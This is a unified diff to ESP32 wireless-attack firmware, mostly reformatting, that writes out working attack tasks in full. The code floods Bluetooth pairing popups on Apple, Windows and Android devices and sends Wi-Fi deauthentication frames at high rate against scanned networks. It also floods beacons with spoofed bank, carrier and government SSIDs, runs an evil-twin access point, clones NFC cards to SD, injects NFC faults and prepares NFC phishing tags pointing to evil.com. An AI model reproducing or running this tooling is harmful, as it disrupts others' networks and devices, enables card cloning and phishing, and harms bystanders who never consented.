@@ -1,8 +1,8 @@
 #include "attacks_manager.h"
+#include "modules/piezo_driver.h"
 #include "pin_config.h"
 #include "rf_core.h"
 #include "s3_driver.h"
-#include "modules/piezo_driver.h"
 
 // External Dependencies
 #include <NimBLEDevice.h>
@@ -10,16 +10,17 @@
 #include <esp_wifi.h>
 
 // Internal Drivers
-#include "gps_driver.h"
-#include "sd_adapter.h"
-#include "nfc_driver.h"
-#include "usb_driver.h"
 #include "core/aggressive_sd.h"
+#include "gps_driver.h"
+#include "nfc_driver.h"
+#include "sd_adapter.h"
+#include "usb_driver.h"
 
 // TTS, AI e Logging
-#include "tts_espeak.h"
-#include "q_learn_ia.h"
 #include "logger.h"
+#include "q_learn_ia.h"
+#include "tts_espeak.h"
+#include "chameleon_anim.h"
 
 // ============================================================================
 // GLOBALS
@@ -40,7 +41,7 @@ static void set_module_power(int mod_type) {
     bool cc = (mod_type == 1);
     bool nfc = (mod_type == 2);
     bool ble = (mod_type == 3);
-    MonsterDriver::powerOnModules(false, ble, nfc, cc);
+    MorphDriver::powerOnModules(false, ble, nfc, cc);
 }
 
 // ============================================================================
@@ -48,27 +49,68 @@ static void set_module_power(int mod_type) {
 // ============================================================================
 
 // --- NOMES BRASILEIROS PARA BLE SPAM (PSRAM) ---
-static const char* ble_names_br[] PROGMEM = {
+static const char *ble_names_br[] PROGMEM = {
     // Operadoras
-    "Oi Celular", "Vivo 5G", "Claro Fixo", "GVT Internet", "TIM Fibra",
-    "NET WiFi", "Oi Fibra", "Vivo TV", "Claro TV", "Sky HD",
+    "Oi Celular",
+    "Vivo 5G",
+    "Claro Fixo",
+    "GVT Internet",
+    "TIM Fibra",
+    "NET WiFi",
+    "Oi Fibra",
+    "Vivo TV",
+    "Claro TV",
+    "Sky HD",
     // Porteiros e interfones
-    "Intelbras Porteiro", "HDL Interfone", "JFL Alarme", "Amelco Central",
-    "Came Portao", "Rossi Motor", "PPA Automatico", "Garen Portao",
+    "Intelbras Porteiro",
+    "HDL Interfone",
+    "JFL Alarme",
+    "Amelco Central",
+    "Came Portao",
+    "Rossi Motor",
+    "PPA Automatico",
+    "Garen Portao",
     // TVs e dispositivos
-    "Samsung Smart TV", "LG TV", "Philco TV", "TCL Android", "AOC Smart",
-    "Multilaser Tab", "Positivo Tablet", "Xiaomi Mi", "Motorola Edge",
+    "Samsung Smart TV",
+    "LG TV",
+    "Philco TV",
+    "TCL Android",
+    "AOC Smart",
+    "Multilaser Tab",
+    "Positivo Tablet",
+    "Xiaomi Mi",
+    "Motorola Edge",
     // Áudio
-    "JBL Speaker", "Philips SoundBar", "Mondial Caixa", "Britania Som",
+    "JBL Speaker",
+    "Philips SoundBar",
+    "Mondial Caixa",
+    "Britania Som",
     // Eletrodomésticos
-    "Electrolux Smart", "Brastemp Geladeira", "Consul AC", "Midea Ar",
+    "Electrolux Smart",
+    "Brastemp Geladeira",
+    "Consul AC",
+    "Midea Ar",
     // Acessórios
-    "Haylou GT", "QCY Fone", "Redmi Buds", "Baseus TWS", "Edifier X3",
+    "Haylou GT",
+    "QCY Fone",
+    "Redmi Buds",
+    "Baseus TWS",
+    "Edifier X3",
     // Carros
-    "VW Connect", "Fiat Live On", "GM OnStar", "Toyota Link", "Honda Sense",
+    "VW Connect",
+    "Fiat Live On",
+    "GM OnStar",
+    "Toyota Link",
+    "Honda Sense",
     // Genéricos
-    "Bluetooth Device", "Wireless Audio", "Smart Speaker", "TV Box",
-    "Robot Aspirador", "Cafeteira Smart", "Lampada WiFi", "Tomada Inteligente"
+    "Bluetooth Device",
+    "Wireless Audio",
+    "Smart Speaker",
+    "TV Box",
+    "Robot Aspirador",
+    "Cafeteira Smart",
+    "Lampada WiFi",
+    "Tomada Inteligente"
 };
 #define BLE_NAMES_COUNT (sizeof(ble_names_br) / sizeof(ble_names_br[0]))
 
@@ -76,63 +118,70 @@ static const char* ble_names_br[] PROGMEM = {
 static void task_ble_spam(void *pvParameters) {
     Serial.println("[ATTACK] BLE Spam BR iniciando - 1200 pps...");
     set_module_power(3);
-    
+
     // Inicializa NimBLE sem nome fixo
     NimBLEDevice::init("");
-    NimBLEDevice::setPower(ESP_PWR_LVL_P9);  // Máxima potência
-    
+    NimBLEDevice::setPower(ESP_PWR_LVL_P9); // Máxima potência
+
     NimBLEAdvertising *pAdvertising = NimBLEDevice::getAdvertising();
-    pAdvertising->setMinInterval(0x20);  // Mínimo intervalo
+    pAdvertising->setMinInterval(0x20); // Mínimo intervalo
     pAdvertising->setMaxInterval(0x20);
-    
+
     // Buffer para MAC randômico
     uint8_t randomMac[6];
     uint32_t packet_count = 0;
     uint32_t start_time = millis();
-    
+
     // Aloca buffer na PSRAM para advertising data
-    NimBLEAdvertisementData* advData = new NimBLEAdvertisementData();
-    
+    NimBLEAdvertisementData *advData = new NimBLEAdvertisementData();
+
     // Voz: "BLE spamando"
-    extern void tts_speak(const char*);
+    extern void tts_speak(const char *);
     tts_speak("ble_spamando");
-    
+
     while (!stop_requested) {
         // MAC randômico (primeiro byte com bit local setado)
         esp_fill_random(randomMac, 6);
-        randomMac[0] = (randomMac[0] | 0x02) & 0xFE;  // Local, unicast
-        
+        randomMac[0] = (randomMac[0] | 0x02) & 0xFE; // Local, unicast
+
         // Muda MAC
         NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);
         ble_hs_id_set_rnd(randomMac);
-        
+
         // Nome aleatório da lista BR
         int nameIdx = random(BLE_NAMES_COUNT);
         advData->setName(ble_names_br[nameIdx]);
-        
+
         // Flags BLE
         advData->setFlags(ESP_BLE_ADV_FLAG_GEN_DISC | ESP_BLE_ADV_FLAG_BREDR_NOT_SPT);
-        
+
         pAdvertising->setAdvertisementData(*advData);
-        pAdvertising->start(0);  // Non-blocking
-        
+        pAdvertising->start(0); // Non-blocking
+
         // 1200 pps = 833us entre pacotes
         delayMicroseconds(833);
-        
+
         pAdvertising->stop();
         packet_count++;
-        
+
         // Log a cada 1000 pacotes
         if (packet_count % 1000 == 0) {
             uint32_t elapsed = millis() - start_time;
             float pps = (packet_count * 1000.0f) / elapsed;
-            Serial.printf("[BLE] %lu pacotes, %.0f pps, MAC: %02X:%02X:%02X:%02X:%02X:%02X\n",
-                          packet_count, pps,
-                          randomMac[0], randomMac[1], randomMac[2],
-                          randomMac[3], randomMac[4], randomMac[5]);
+            Serial.printf(
+                "[BLE] %lu pacotes, %.0f pps, MAC: %02X:%02X:%02X:%02X:%02X:%02X\n",
+                packet_count,
+                pps,
+                randomMac[0],
+                randomMac[1],
+                randomMac[2],
+                randomMac[3],
+                randomMac[4],
+                randomMac[5]
+            );
         }
     }
-    
+
     delete advData;
     NimBLEDevice::deinit();
     set_module_power(0);
@@ -145,33 +194,38 @@ static void task_ble_sour_apple(void *pvParameters) {
     Serial.println("[ATTACK] Starting Sour Apple (iOS)...");
     set_module_power(3);
     NimBLEDevice::init("");
-    
+
     NimBLEAdvertising *pAdv = NimBLEDevice::getAdvertising();
-    
+
     // Apple proximity pairing packet
     uint8_t appleData[] = {
-        0x10, 0xFF,             // Manufacturer Specific Data
-        0x4C, 0x00,             // Apple Inc
-        0x0F, 0x05,             // Proximity Pairing
-        0x01,                   // Packet Type
-        0x00,                   // Device Model (random)
-        0x00,                   // Status
-        0x00, 0x00, 0x00        // Padding
+        0x10,
+        0xFF, // Manufacturer Specific Data
+        0x4C,
+        0x00, // Apple Inc
+        0x0F,
+        0x05, // Proximity Pairing
+        0x01, // Packet Type
+        0x00, // Device Model (random)
+        0x00, // Status
+        0x00,
+        0x00,
+        0x00 // Padding
     };
-    
+
     while (!stop_requested) {
         // Randomize device model to cause multiple popups
         appleData[7] = random(0x00, 0xFF);
         appleData[8] = random(0x00, 0x10);
-        
+
         NimBLEAdvertisementData advData;
-        advData.addData(std::string((char*)appleData, sizeof(appleData)));
+        advData.addData(std::string((char *)appleData, sizeof(appleData)));
         pAdv->setAdvertisementData(advData);
         pAdv->start();
         delay(50);
         pAdv->stop();
     }
-    
+
     NimBLEDevice::deinit();
     set_module_power(0);
     vTaskDelete(NULL);
@@ -182,35 +236,37 @@ static void task_ble_swift_pair(void *pvParameters) {
     Serial.println("[ATTACK] Starting Swift Pair (Windows)...");
     set_module_power(3);
     NimBLEDevice::init("");
-    
+
     NimBLEAdvertising *pAdv = NimBLEDevice::getAdvertising();
-    
+
     // Microsoft Swift Pair packet
     uint8_t swiftData[] = {
-        0x06, 0xFF,             // Manufacturer Data
-        0x06, 0x00,             // Microsoft
-        0x03,                   // Swift Pair
-        0x00,                   // Scenario
-        0x80,                   // Reserved
-        0x00                    // Device ID
+        0x06,
+        0xFF, // Manufacturer Data
+        0x06,
+        0x00, // Microsoft
+        0x03, // Swift Pair
+        0x00, // Scenario
+        0x80, // Reserved
+        0x00  // Device ID
     };
-    
-    const char* deviceNames[] = {"Surface Mouse", "Xbox Controller", "Arc Mouse", "Designer Mouse"};
+
+    const char *deviceNames[] = {"Surface Mouse", "Xbox Controller", "Arc Mouse", "Designer Mouse"};
     int idx = 0;
-    
+
     while (!stop_requested) {
         swiftData[7] = random(0, 0xFF);
-        
+
         NimBLEAdvertisementData advData;
         advData.setName(deviceNames[idx % 4]);
-        advData.addData(std::string((char*)swiftData, sizeof(swiftData)));
+        advData.addData(std::string((char *)swiftData, sizeof(swiftData)));
         pAdv->setAdvertisementData(advData);
         pAdv->start();
         delay(100);
         pAdv->stop();
         idx++;
     }
-    
+
     NimBLEDevice::deinit();
     set_module_power(0);
     vTaskDelete(NULL);
@@ -221,41 +277,47 @@ static void task_ble_fast_pair(void *pvParameters) {
     Serial.println("[ATTACK] Starting Fast Pair (Android)...");
     set_module_power(3);
     NimBLEDevice::init("");
-    
+
     NimBLEAdvertising *pAdv = NimBLEDevice::getAdvertising();
-    
+
     // Google Fast Pair service data
     // Model IDs from real devices
     uint32_t modelIds[] = {
-        0x2D7A23,  // Pixel Buds
-        0x00B727,  // Sony WF-1000XM4
-        0xCD8256,  // Samsung Buds
-        0x0000F0,  // JBL
-        0xD446A7   // Beats
+        0x2D7A23, // Pixel Buds
+        0x00B727, // Sony WF-1000XM4
+        0xCD8256, // Samsung Buds
+        0x0000F0, // JBL
+        0xD446A7  // Beats
     };
-    
+
     int idx = 0;
-    
+
     while (!stop_requested) {
         uint32_t modelId = modelIds[idx % 5];
-        
+
         uint8_t fastPairData[] = {
-            0x03, 0x03, 0x2C, 0xFE,  // Service UUID
-            0x06, 0x16, 0x2C, 0xFE,  // Service Data header
+            0x03,
+            0x03,
+            0x2C,
+            0xFE, // Service UUID
+            0x06,
+            0x16,
+            0x2C,
+            0xFE, // Service Data header
             (uint8_t)((modelId >> 16) & 0xFF),
             (uint8_t)((modelId >> 8) & 0xFF),
             (uint8_t)(modelId & 0xFF)
         };
-        
+
         NimBLEAdvertisementData advData;
-        advData.addData(std::string((char*)fastPairData, sizeof(fastPairData)));
+        advData.addData(std::string((char *)fastPairData, sizeof(fastPairData)));
         pAdv->setAdvertisementData(advData);
         pAdv->start();
         delay(100);
         pAdv->stop();
         idx++;
     }
-    
+
     NimBLEDevice::deinit();
     set_module_power(0);
     vTaskDelete(NULL);
@@ -264,15 +326,15 @@ static void task_ble_fast_pair(void *pvParameters) {
 // --- WIFI DEAUTH TASK - 1500 FRAMES/SEGUNDO ---
 static void task_wifi_deauth(void *pvParameters) {
     Serial.println("[ATTACK] WiFi Deauth iniciando - 1500 fps...");
-    
+
     // Configura WiFi em modo STA para injeção
     WiFi.mode(WIFI_MODE_STA);
     WiFi.disconnect();
-    
+
     // Habilita modo promíscuo para injeção de pacotes
     esp_wifi_set_promiscuous(true);
     esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
-    
+
     // Frame template de deauth (26 bytes)
     uint8_t deauthFrame[] = {
         0xC0, 0x00,                         // Frame Control (Deauth)
@@ -283,24 +345,24 @@ static void task_wifi_deauth(void *pvParameters) {
         0x00, 0x00,                         // Sequence
         0x07, 0x00                          // Reason (Class 3 frame)
     };
-    
+
     // Frame de disassociation
     uint8_t disassocFrame[26];
     memcpy(disassocFrame, deauthFrame, 26);
-    disassocFrame[0] = 0xA0;  // Disassoc frame type
-    
+    disassocFrame[0] = 0xA0; // Disassoc frame type
+
     // Estatísticas
     uint32_t frame_count = 0;
     uint32_t start_time = millis();
-    
+
     // Voz: "Deauth rodando"
-    extern void tts_speak(const char*);
+    extern void tts_speak(const char *);
     tts_speak("deauth_rodando");
-    
+
     // Scan inicial de alvos
     int n = WiFi.scanNetworks(false, false, false, 100);
     Serial.printf("[DEAUTH] %d alvos encontrados\n", n);
-    
+
     // Armazena alvos (máximo 20)
     struct Target {
         uint8_t bssid[6];
@@ -309,9 +371,9 @@ static void task_wifi_deauth(void *pvParameters) {
     };
     Target targets[20];
     int numTargets = min(n, 20);
-    
+
     for (int i = 0; i < numTargets; i++) {
-        uint8_t* bssid = WiFi.BSSID(i);
+        uint8_t *bssid = WiFi.BSSID(i);
         if (bssid) {
             memcpy(targets[i].bssid, bssid, 6);
             targets[i].channel = WiFi.channel(i);
@@ -319,28 +381,28 @@ static void task_wifi_deauth(void *pvParameters) {
         }
     }
     WiFi.scanDelete();
-    
+
     // Loop principal de ataque
     int currentTarget = 0;
-    
+
     while (!stop_requested) {
         if (numTargets == 0) {
             delay(1000);
             continue;
         }
-        
+
         // Seleciona alvo
-        Target* t = &targets[currentTarget % numTargets];
-        
+        Target *t = &targets[currentTarget % numTargets];
+
         // Muda canal
         esp_wifi_set_channel(t->channel, WIFI_SECOND_CHAN_NONE);
-        
+
         // Configura MACs no frame
-        memcpy(&deauthFrame[10], t->bssid, 6);   // Source
-        memcpy(&deauthFrame[16], t->bssid, 6);   // BSSID
+        memcpy(&deauthFrame[10], t->bssid, 6); // Source
+        memcpy(&deauthFrame[16], t->bssid, 6); // BSSID
         memcpy(&disassocFrame[10], t->bssid, 6);
         memcpy(&disassocFrame[16], t->bssid, 6);
-        
+
         // Envia rajada de 100 frames no alvo atual
         for (int j = 0; j < 100 && !stop_requested; j++) {
             // Alterna deauth e disassoc
@@ -349,24 +411,31 @@ static void task_wifi_deauth(void *pvParameters) {
             } else {
                 esp_wifi_80211_tx(WIFI_IF_STA, disassocFrame, sizeof(disassocFrame), false);
             }
-            
+
             frame_count++;
-            
+
             // 1500 fps = 666us entre frames
             delayMicroseconds(666);
         }
-        
+
         // Próximo alvo
         currentTarget++;
-        
+
         // Log a cada 1000 frames
         if (frame_count % 1000 == 0) {
             uint32_t elapsed = millis() - start_time;
             float fps = (frame_count * 1000.0f) / elapsed;
-            Serial.printf("[DEAUTH] %lu frames, %.0f fps, alvo: %02X:%02X:%02X:%02X:%02X:%02X\n",
-                          frame_count, fps,
-                          t->bssid[0], t->bssid[1], t->bssid[2],
-                          t->bssid[3], t->bssid[4], t->bssid[5]);
+            Serial.printf(
+                "[DEAUTH] %lu frames, %.0f fps, alvo: %02X:%02X:%02X:%02X:%02X:%02X\n",
+                frame_count,
+                fps,
+                t->bssid[0],
+                t->bssid[1],
+                t->bssid[2],
+                t->bssid[3],
+                t->bssid[4],
+                t->bssid[5]
+            );
         }
     }
 
@@ -377,115 +446,174 @@ static void task_wifi_deauth(void *pvParameters) {
 }
 
 // --- WIFI BEACON FLOOD BR - 500 APs/SEGUNDO ---
-static const char* ssids_br[] PROGMEM = {
+static const char *ssids_br[] PROGMEM = {
     // Operadoras
-    "Vivo Fibra", "Vivo TV", "Vivo WiFi", "Vivo 5G Home",
-    "GVT Internet", "GVT Fibra", "GVT Guest",
-    "Oi Fibra", "Oi WiFi", "Oi Total",
-    "NET WiFi", "NET Virtua", "NET Guest", "Claro NET",
-    "Claro Fibra", "Claro WiFi", "Claro 5G",
-    "TIM Fibra", "TIM WiFi", "TIM Live",
-    "Sky WiFi", "Sky Fibra",
+    "Vivo Fibra",
+    "Vivo TV",
+    "Vivo WiFi",
+    "Vivo 5G Home",
+    "GVT Internet",
+    "GVT Fibra",
+    "GVT Guest",
+    "Oi Fibra",
+    "Oi WiFi",
+    "Oi Total",
+    "NET WiFi",
+    "NET Virtua",
+    "NET Guest",
+    "Claro NET",
+    "Claro Fibra",
+    "Claro WiFi",
+    "Claro 5G",
+    "TIM Fibra",
+    "TIM WiFi",
+    "TIM Live",
+    "Sky WiFi",
+    "Sky Fibra",
     // Estabelecimentos
-    "McDonalds Free WiFi", "Starbucks WiFi", "iFood Parceiro",
-    "Uber Free WiFi", "99 Taxi", "Rappi Express",
-    "Mercado Livre", "Magazine Luiza", "Casas Bahia WiFi",
+    "McDonalds Free WiFi",
+    "Starbucks WiFi",
+    "iFood Parceiro",
+    "Uber Free WiFi",
+    "99 Taxi",
+    "Rappi Express",
+    "Mercado Livre",
+    "Magazine Luiza",
+    "Casas Bahia WiFi",
     // Bancos
-    "Itau Atendimento", "Bradesco Digital", "Banco do Brasil",
-    "Caixa WiFi", "Santander Guest", "Nubank Office",
+    "Itau Atendimento",
+    "Bradesco Digital",
+    "Banco do Brasil",
+    "Caixa WiFi",
+    "Santander Guest",
+    "Nubank Office",
     // Governo
-    "WiFi Livre SP", "Internet Gratuita RJ", "Prefeitura WiFi",
+    "WiFi Livre SP",
+    "Internet Gratuita RJ",
+    "Prefeitura WiFi",
     // Genéricos
-    "Condominio Residencial", "Portaria", "Salao Festas",
-    "Academia Smart Fit", "Farmacia Popular",
-    "Hospital WiFi", "Escola Publica", "Igreja Evangelica"
+    "Condominio Residencial",
+    "Portaria",
+    "Salao Festas",
+    "Academia Smart Fit",
+    "Farmacia Popular",
+    "Hospital WiFi",
+    "Escola Publica",
+    "Igreja Evangelica"
 };
 #define SSIDS_BR_COUNT (sizeof(ssids_br) / sizeof(ssids_br[0]))
 
 static void task_wifi_beacon_spam(void *pvParameters) {
     Serial.println("[ATTACK] Beacon Flood BR iniciando - 500 APs/s...");
-    
+
     // Promiscuous mode para injeção de beacons crus
     WiFi.mode(WIFI_MODE_STA);
     WiFi.disconnect();
     esp_wifi_set_promiscuous(true);
-    
+
     // Template de beacon frame (80 bytes base)
     uint8_t beaconFrame[] = {
-        0x80, 0x00,                         // Frame Control (Beacon)
-        0x00, 0x00,                         // Duration
-        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (broadcast)
-        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (random MAC)
-        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (same as source)
-        0x00, 0x00,                         // Sequence
+        0x80,
+        0x00, // Frame Control (Beacon)
+        0x00,
+        0x00, // Duration
+        0xFF,
+        0xFF,
+        0xFF,
+        0xFF,
+        0xFF,
+        0xFF, // Destination (broadcast)
+        0x00,
+        0x00,
+        0x00,
+        0x00,
+        0x00,
+        0x00, // Source (random MAC)
+        0x00,
+        0x00,
+        0x00,
+        0x00,
+        0x00,
+        0x00, // BSSID (same as source)
+        0x00,
+        0x00, // Sequence
         // Fixed parameters (12 bytes)
-        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Timestamp
-        0x64, 0x00,                         // Beacon interval (100ms)
-        0x11, 0x04,                         // Capabilities
+        0x00,
+        0x00,
+        0x00,
+        0x00,
+        0x00,
+        0x00,
+        0x00,
+        0x00, // Timestamp
+        0x64,
+        0x00, // Beacon interval (100ms)
+        0x11,
+        0x04, // Capabilities
         // Tagged parameters start here...
     };
-    
+
     // Buffer para frame completo
     uint8_t fullFrame[128];
-    
+
     uint32_t beacon_count = 0;
     uint32_t start_time = millis();
-    
+
     // Voz
-    extern void tts_speak(const char*);
+    extern void tts_speak(const char *);
     tts_speak("ataque_iniciado");
-    
+
     while (!stop_requested) {
         for (int i = 0; i < 50 && !stop_requested; i++) {
             // MAC randômico
             uint8_t mac[6];
             esp_fill_random(mac, 6);
-            mac[0] = (mac[0] & 0xFC) | 0x02;  // Local, unicast
-            
-            memcpy(&beaconFrame[10], mac, 6);  // Source
-            memcpy(&beaconFrame[16], mac, 6);  // BSSID
-            
+            mac[0] = (mac[0] & 0xFC) | 0x02; // Local, unicast
+
+            memcpy(&beaconFrame[10], mac, 6); // Source
+            memcpy(&beaconFrame[16], mac, 6); // BSSID
+
             // SSID aleatório
             int ssidIdx = random(SSIDS_BR_COUNT);
-            const char* ssid = ssids_br[ssidIdx];
+            const char *ssid = ssids_br[ssidIdx];
             uint8_t ssidLen = strlen(ssid);
-            
+
             // Monta frame completo
             memcpy(fullFrame, beaconFrame, 36);
-            
+
             // Tag SSID
-            fullFrame[36] = 0x00;  // Tag ID: SSID
+            fullFrame[36] = 0x00; // Tag ID: SSID
             fullFrame[37] = ssidLen;
             memcpy(&fullFrame[38], ssid, ssidLen);
-            
+
             // Tag Supported Rates
             uint8_t ratesOffset = 38 + ssidLen;
             fullFrame[ratesOffset] = 0x01;  // Tag ID
             fullFrame[ratesOffset + 1] = 8; // Length
             uint8_t rates[] = {0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24};
             memcpy(&fullFrame[ratesOffset + 2], rates, 8);
-            
+
             // Tag Channel
             uint8_t chanOffset = ratesOffset + 10;
             uint8_t channel = random(1, 14);
-            fullFrame[chanOffset] = 0x03;     // Tag ID: DS Parameter
-            fullFrame[chanOffset + 1] = 1;    // Length
+            fullFrame[chanOffset] = 0x03;  // Tag ID: DS Parameter
+            fullFrame[chanOffset + 1] = 1; // Length
             fullFrame[chanOffset + 2] = channel;
-            
+
             int frameLen = chanOffset + 3;
-            
+
             // Canal aleatório
             esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
-            
+
             // Envia beacon
             esp_wifi_80211_tx(WIFI_IF_STA, fullFrame, frameLen, false);
-            
+
             beacon_count++;
-            
+
             // 500 beacons/s = 2ms entre cada
             delayMicroseconds(2000);
         }
-        
+
         // Log a cada 1000 beacons
         if (beacon_count % 1000 == 0) {
             uint32_t elapsed = millis() - start_time;
@@ -493,7 +621,7 @@ static void task_wifi_beacon_spam(void *pvParameters) {
             Serial.printf("[BEACON] %lu beacons, %.0f/s\n", beacon_count, bps);
         }
     }
-    
+
     esp_wifi_set_promiscuous(false);
     WiFi.mode(WIFI_OFF);
     Serial.printf("[BEACON] Finalizado: %lu beacons\n", beacon_count);
@@ -503,21 +631,21 @@ static void task_wifi_beacon_spam(void *pvParameters) {
 // --- WIFI EVIL TWIN ---
 static void task_wifi_evil_twin(void *pvParameters) {
     Serial.println("[ATTACK] Starting Evil Twin...");
-    
+
     // First, scan for target network
     WiFi.mode(WIFI_MODE_STA);
     int n = WiFi.scanNetworks();
-    
+
     if (n == 0) {
         Serial.println("[EVIL TWIN] No networks found");
         vTaskDelete(NULL);
         return;
     }
-    
+
     // Decide target
     String targetSSID;
     int targetChannel = 6;
-    
+
     if (evil_twin_ssid[0] != 0) {
         targetSSID = String(evil_twin_ssid);
         Serial.printf("[EVIL TWIN] Using template: %s (Channel 6)\n", targetSSID.c_str());
@@ -527,18 +655,16 @@ static void task_wifi_evil_twin(void *pvParameters) {
         targetChannel = WiFi.channel(0);
         Serial.printf("[EVIL TWIN] Cloning: %s on ch %d\n", targetSSID.c_str(), targetChannel);
     }
-    
+
     // Setup as AP with same SSID (open network)
     WiFi.mode(WIFI_MODE_APSTA);
     WiFi.softAP(targetSSID.c_str(), "", targetChannel);
-    
+
     // The web dashboard handles the captive portal
     Serial.println("[EVIL TWIN] Captive portal active");
-    
-    while (!stop_requested) {
-        delay(1000);
-    }
-    
+
+    while (!stop_requested) { delay(1000); }
+
     WiFi.softAPdisconnect(true);
     WiFi.mode(WIFI_OFF);
     vTaskDelete(NULL);
@@ -549,29 +675,29 @@ static void task_wifi_pmkid(void *pvParameters) {
     Serial.println("[ATTACK] Starting PMKID Capture...");
     WiFi.mode(WIFI_MODE_STA);
     esp_wifi_set_promiscuous(true);
-    
+
     // The PMKID is in the first EAPOL message
     // This is a passive capture - we just log potential PMKID frames
-    
+
     while (!stop_requested) {
         // Scan networks
         int n = WiFi.scanNetworks(false, false);
-        
+
         for (int i = 0; i < n && !stop_requested; i++) {
             String ssid = WiFi.SSID(i);
             int rssi = WiFi.RSSI(i);
-            
+
             if (WiFi.encryptionType(i) == WIFI_AUTH_WPA2_PSK ||
                 WiFi.encryptionType(i) == WIFI_AUTH_WPA_WPA2_PSK) {
                 Serial.printf("[PMKID] Target found: %s (%d dBm) - WPA2\n", ssid.c_str(), rssi);
                 // Real PMKID capture would require monitoring EAPOL frames
             }
         }
-        
+
         WiFi.scanDelete();
         delay(5000);
     }
-    
+
     esp_wifi_set_promiscuous(false);
     WiFi.mode(WIFI_OFF);
     vTaskDelete(NULL);
@@ -803,12 +929,8 @@ static void task_rf_spectrum(void *pvParameters) {
 
     while (!stop_requested) {
         RFCore::updateScanner();
-
-        SpectrumData data = RFCore::getSpectrumData();
-        float strongest = RFCore::findStrongestFrequency();
-
-        Serial.printf("[RF] Scan: Strongest @ %.2f MHz\n", strongest);
-        delay(500);
+        // Give time for CPU but don't block scan speed significantly
+        delay(1);
     }
 
     RFCore::stopFrequencyScan();
@@ -885,7 +1007,7 @@ static void task_ir_brute(void *pvParameters) {
         for (uint8_t cmd = 0x00; cmd <= 0x20 && !stop_requested; cmd++) {
             irDriver.sendNEC(userCode, cmd);
             delay(50);
-            
+
             if (userCode % 0x1000 == 0) {
                 Serial.printf("[IR] Brute: User=0x%04X, Cmd=0x%02X\n", userCode, cmd);
             }
@@ -899,29 +1021,34 @@ static void task_ir_brute(void *pvParameters) {
 // --- NFC CLONE TASK (PN532) ---
 static void task_nfc_clone(void *pvParameters) {
     Serial.println("[ATTACK] Starting NFC Clone...");
-    
+
     if (!NFCDriver::init()) {
         Serial.println("[NFC] Failed to initialize PN532");
         vTaskDelete(NULL);
         return;
     }
-    
+
     Serial.println("[NFC] Waiting for card to clone...");
     Serial.println("[NFC] Place card near reader...");
-    
+
     while (!stop_requested) {
         NFCCard card = NFCDriver::readCard(500);
-        
+
         if (card.valid) {
-            Serial.printf("[NFC] Card found! UID: %s\n", 
-                         NFCDriver::uidToString(card.uid, card.uidLength).c_str());
+            Serial.printf(
+                "[NFC] Card found! UID: %s\n", NFCDriver::uidToString(card.uid, card.uidLength).c_str()
+            );
             Serial.printf("[NFC] Type: %s\n", NFCDriver::getTypeName(card.type));
-            
+
             // Clone to SD card
             char filename[64];
-            snprintf(filename, sizeof(filename), "/nfc/clone_%s.json",
-                    NFCDriver::uidToString(card.uid, card.uidLength).c_str());
-            
+            snprintf(
+                filename,
+                sizeof(filename),
+                "/nfc/clone_%s.json",
+                NFCDriver::uidToString(card.uid, card.uidLength).c_str()
+            );
+
             if (NFCDriver::cloneToFile(filename)) {
                 Serial.printf("[NFC] Card cloned to %s\n", filename);
                 // Beep for feedback
@@ -930,43 +1057,44 @@ static void task_nfc_clone(void *pvParameters) {
                 Serial.println("[NFC] Clone failed!");
                 Piezo.playErrorSound();
             }
-            
+
             delay(2000); // Wait before next read
         }
-        
+
         delay(100);
     }
-    
+
     vTaskDelete(NULL);
 }
 
 // --- NFC FAULT INJECTION TASK ---
 static void task_nfc_fault(void *pvParameters) {
     Serial.println("[ATTACK] Starting NFC Fault Injection...");
-    
+
     if (!NFCDriver::init()) {
         Serial.println("[NFC] Failed to initialize PN532");
         vTaskDelete(NULL);
         return;
     }
-    
+
     Serial.println("[NFC] Fault injection mode active...");
     Serial.println("[NFC] Cycling through fault patterns...");
-    
+
     uint8_t pattern = 0;
-    
+
     while (!stop_requested) {
         // Try to read any card first
         NFCCard card = NFCDriver::readCard(200);
-        
+
         if (card.valid) {
-            Serial.printf("[NFC] Target detected: %s\n",
-                         NFCDriver::uidToString(card.uid, card.uidLength).c_str());
-            
+            Serial.printf(
+                "[NFC] Target detected: %s\n", NFCDriver::uidToString(card.uid, card.uidLength).c_str()
+            );
+
             // Send fault pattern
             NFCDriver::sendFaultPattern(pattern);
             Serial.printf("[NFC] Sent fault pattern %d\n", pattern);
-            
+
             pattern = (pattern + 1) % 4;
             delay(500);
         } else {
@@ -975,56 +1103,59 @@ static void task_nfc_fault(void *pvParameters) {
             delay(100);
         }
     }
-    
+
     vTaskDelete(NULL);
 }
 
 // --- NFC PHISHING TASK ---
 static void task_nfc_phishing(void *pvParameters) {
     Serial.println("[ATTACK] Starting NFC Phishing...");
-    
+
     if (!NFCDriver::init()) {
         Serial.println("[NFC] Failed to initialize PN532");
         vTaskDelete(NULL);
         return;
     }
-    
+
     // Phishing URL - change to your attack server
-    const char* phishingUrl = "evil.com/phish";
-    
+    const char *phishingUrl = "evil.com/phish";
+
     Serial.printf("[NFC] Preparing phishing NDEF: http://%s\n", phishingUrl);
-    
+
     if (NFCDriver::emulateNDEF(phishingUrl)) {
         Serial.println("[NFC] NDEF prepared. Write to writable tag or wait for emulation.");
     }
-    
+
     // Wait for writable tag to write phishing NDEF
     while (!stop_requested) {
         NFCCard card = NFCDriver::readCard(500);
-        
+
         if (card.valid && card.type == NFC_TYPE_MIFARE_ULTRALIGHT) {
             Serial.println("[NFC] Writable tag detected - writing phishing URL...");
-            
+
             // Create simple NDEF URI record
             uint8_t ndefData[16] = {
-                0x03, 0x0D,               // NDEF message header
-                0xD1, 0x01, 0x09,         // Record header
-                'U',                       // Type: URI
-                0x01,                      // Identifier: http://www.
+                0x03,
+                0x0D, // NDEF message header
+                0xD1,
+                0x01,
+                0x09, // Record header
+                'U',  // Type: URI
+                0x01, // Identifier: http://www.
             };
             memcpy(&ndefData[7], phishingUrl, min(9, (int)strlen(phishingUrl)));
             ndefData[15] = 0xFE; // Terminator
-            
+
             // Note: Full NTAG write would need different approach
             Serial.println("[NFC] Phishing tag would be written here");
-            
+
             Piezo.beep(1, 200);
             delay(2000);
         }
-        
+
         delay(100);
     }
-    
+
     NFCDriver::stopEmulation();
